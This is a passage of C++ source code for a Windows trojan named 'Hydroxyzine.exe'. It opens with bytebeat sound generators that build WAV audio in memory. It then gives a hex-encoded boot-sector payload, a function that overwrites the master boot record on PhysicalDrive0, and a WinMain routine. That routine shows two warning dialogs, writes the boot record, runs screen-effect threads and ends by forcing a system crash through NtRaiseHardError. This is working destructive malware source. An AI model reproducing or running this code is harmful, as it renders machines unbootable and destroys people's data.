
	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound7(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * (t >> 9) * t ^ t & t
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound8(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t ^ t >> 8 ^ (t >> 6) * (t >> 4)
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound9(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t ^ t | t >> 9 * rand()
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

void sound10(int hz, int secs) {
	const int sample_rate = hz;
	const int channels = 1;
	const int bits_per_sample = 8;
	const int data_size = sample_rate * secs;

	BYTE* data = new BYTE[data_size];
	for (int t = 2; t < data_size; ++t) {
		data[t] = static_cast<BYTE>(
			t * rand()
			);
	}

	uint32_t total_size = 44 + data_size;
	BYTE* wav = new BYTE[total_size];
	BYTE* ptr = wav;

	auto write = [&](const void* src, size_t size) {
		memcpy(ptr, src, size);
		ptr += size;
		};

	write("RIFF", 4);
	uint32_t chunk_size = total_size - 8;
	write(&chunk_size, 4);
	write("WAVE", 4);

	write("fmt ", 4);
	uint32_t subchunk1_size = 16;
	write(&subchunk1_size, 4);
	uint16_t audio_format = 1;
	write(&audio_format, 2);
	uint16_t num_channels = channels;
	write(&num_channels, 2);
	uint32_t sample_rate_dw = sample_rate;
	write(&sample_rate_dw, 4);
	uint32_t byte_rate = sample_rate * channels * bits_per_sample / 8;
	write(&byte_rate, 4);
	uint16_t block_align = channels * bits_per_sample / 8;
	write(&block_align, 2);
	uint16_t bits_per_sample_w = bits_per_sample;
	write(&bits_per_sample_w, 2);

	write("data", 4);
	uint32_t subchunk2_size = data_size;
	write(&subchunk2_size, 4);
	write(data, data_size);

	PlaySoundA(reinterpret_cast<LPCSTR>(wav), NULL, SND_MEMORY | SND_SYNC);

	delete[] data;
	delete[] wav;
}

const unsigned char MBRLAB150[]{ 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0xB4, 0x00, 0xB0, 0x03, 0xCD, 0x10, 0xC6, 0x06, 0xF4, 0x7C,
0x00, 0xC6, 0x06, 0xF5, 0x7C, 0x00, 0xC6, 0x06, 0xF6, 0x7C, 0x01, 0xC6, 0x06, 0xF7, 0x7C, 0x01,
0xB4, 0x02, 0x30, 0xFF, 0x8A, 0x36, 0xF5, 0x7C, 0x8A, 0x16, 0xF4, 0x7C, 0xCD, 0x10, 0xB9, 0x0B,
0x00, 0xB4, 0x09, 0xB0, 0x20, 0xB3, 0x00, 0xCD, 0x10, 0xA0, 0xF4, 0x7C, 0x02, 0x06, 0xF6, 0x7C,
0xA2, 0xF4, 0x7C, 0xA0, 0xF5, 0x7C, 0x02, 0x06, 0xF7, 0x7C, 0xA2, 0xF5, 0x7C, 0x80, 0x3E, 0xF4,
0x7C, 0x00, 0x7E, 0x09, 0x80, 0x3E, 0xF4, 0x7C, 0x45, 0x7D, 0x0E, 0xEB, 0x16, 0xC6, 0x06, 0xF4,
0x7C, 0x00, 0xC6, 0x06, 0xF6, 0x7C, 0x01, 0xEB, 0x0A, 0xC6, 0x06, 0xF4, 0x7C, 0x45, 0xC6, 0x06,
0xF6, 0x7C, 0xFF, 0x80, 0x3E, 0xF5, 0x7C, 0x00, 0x7E, 0x09, 0x80, 0x3E, 0xF5, 0x7C, 0x18, 0x7D,
0x0E, 0xEB, 0x16, 0xC6, 0x06, 0xF5, 0x7C, 0x00, 0xC6, 0x06, 0xF7, 0x7C, 0x01, 0xEB, 0x0A, 0xC6,
0x06, 0xF5, 0x7C, 0x18, 0xC6, 0x06, 0xF7, 0x7C, 0xFF, 0xBE, 0xF9, 0x7C, 0xB3, 0x04, 0xAC, 0x3C,
0x00, 0x74, 0x3F, 0x3C, 0x20, 0x74, 0x35, 0x53, 0xB4, 0x02, 0x30, 0xFF, 0x8A, 0x36, 0xF5, 0x7C,
0x8A, 0x16, 0xF4, 0x7C, 0x02, 0x16, 0xF8, 0x7C, 0xCD, 0x10, 0x5B, 0xB4, 0x09, 0xB9, 0x01, 0x00,
0xCD, 0x10, 0xFE, 0x06, 0xF8, 0x7C, 0x80, 0xFB, 0x04, 0x74, 0x09, 0x80, 0xFB, 0x01, 0x74, 0x08,
0xB3, 0x04, 0xEB, 0xCA, 0xB3, 0x01, 0xEB, 0xC6, 0xB3, 0x02, 0xEB, 0xC2, 0xFE, 0x06, 0xF8, 0x7C,
0xEB, 0xBC, 0xC6, 0x06, 0xF8, 0x7C, 0x00, 0xB9, 0x01, 0x00, 0xBA, 0xA0, 0x86, 0xB4, 0x86, 0xCD,
0x15, 0xE9, 0x2C, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x68, 0x69, 0x73, 0x20, 0x63, 0x6F,
0x6D, 0x70, 0x75, 0x74, 0x65, 0x72, 0x20, 0x69, 0x73, 0x20, 0x66, 0x75, 0x63, 0x6B, 0x65, 0x64,
0x20, 0x62, 0x79, 0x20, 0x48, 0x79, 0x64, 0x72, 0x6F, 0x78, 0x79, 0x7A, 0x69, 0x6E, 0x65, 0x2E,
0x65, 0x78, 0x65, 0x20, 0x54, 0x72, 0x6F, 0x6A, 0x61, 0x6E, 0x21, 0x21, 0x21, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};


DWORD WINAPI MBRKernel(LPVOID lpParam) {
	DWORD dwWrittenBytes;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	CHAR pcNullData[512];
	RtlZeroMemory(pcNullData, 512);

	WriteFile(hDevice, MBRLAB150, 512, &dwWrittenBytes, NULL);
	return 1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (MessageBoxW(NULL, L"you are about to run a malware called Hydroxyzine.exe Trojan.\n\r\nif you run this malware clicking yes then keep in mind your computer is going to be destroyed.\nit also can cause data loss or makes your computer likely unbootable.\nor if you click no then your computer will get safe.\n\r\nare you really sure you really like to execute this malware?\nyou wont be able to use windows again.", L"Hydroxyzine.exe - t.r.0.j.a.n", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	if (MessageBoxW(NULL, L"this is the final warning.\n\r\nif you read this malware previously youll keep in mind your computer is going to be destroyed.\nare you sure you want to run this malware?\nthis your final chance removing this trojan at 1% chance.", L"Hydroxyzine.exe - final", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
	CreateThread(0, 0, MBRKernel, 0, 0, 0);
	Sleep(5000);
	CreateThread(0, 0, opener, 0, 0, 0);
	CreateThread(0, 0, opener2, 0, 0, 0);
	CreateThread(0, 0, opener3, 0, 0, 0);
	HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
	sound1(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread1, 0);
	HANDLE thread2 = CreateThread(0, 0, shader2, 0, 0, 0);
	sound2(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread2, 0);
	HANDLE thread3 = CreateThread(0, 0, shader3, 0, 0, 0);
	HANDLE thread3or1 = CreateThread(0, 0, shader3or1, 0, 0, 0);
	sound3(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread3, 0);
	TerminateThread(thread3or1, 0);
	HANDLE thread4 = CreateThread(0, 0, shader4, 0, 0, 0);
	HANDLE thread4or1 = CreateThread(0, 0, shader4or1, 0, 0, 0);
	HANDLE thread4or2 = CreateThread(0, 0, shader4or2, 0, 0, 0);
	sound4(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread4, 0);
	TerminateThread(thread4or1, 0);
	TerminateThread(thread4or2, 0);
	HANDLE thread5 = CreateThread(0, 0, shader5, 0, 0, 0);
	HANDLE thread5or1 = CreateThread(0, 0, shader5or1, 0, 0, 0);
	sound5(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread5, 0);
	TerminateThread(thread5or1, 0);
	HANDLE thread6 = CreateThread(0, 0, shader6, 0, 0, 0);
	HANDLE thread6or1 = CreateThread(0, 0, shader6or1, 0, 0, 0);
	HANDLE thread6or2 = CreateThread(0, 0, shader6or2, 0, 0, 0);
	sound6(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread6, 0);
	TerminateThread(thread6or1, 0);
	TerminateThread(thread6or2, 0);
	HANDLE thread7 = CreateThread(0, 0, shader7, 0, 0, 0);
	HANDLE thread7or1 = CreateThread(0, 0, shader7or1, 0, 0, 0);
	sound7(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread7, 0);
	TerminateThread(thread7or1, 0);
	HANDLE thread8 = CreateThread(0, 0, shader8, 0, 0, 0);
	HANDLE thread8or1 = CreateThread(0, 0, shader8or1, 0, 0, 0);
	sound8(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread8, 0);
	TerminateThread(thread8or1, 0);
	HANDLE thread9 = CreateThread(0, 0, shader9, 0, 0, 0);
	sound9(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread9, 0);
	HANDLE thread10 = CreateThread(0, 0, shader10, 0, 0, 0);
	sound10(8000, 30);
	Sleep(100);
	InvalidateRect(NULL, NULL, TRUE);
	TerminateThread(thread10, 0);
	BOOLEAN bl;
	DWORD response;
	NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
	RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
	RtlAdjustPrivilege(19, 1, 0, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	Sleep(-1);
}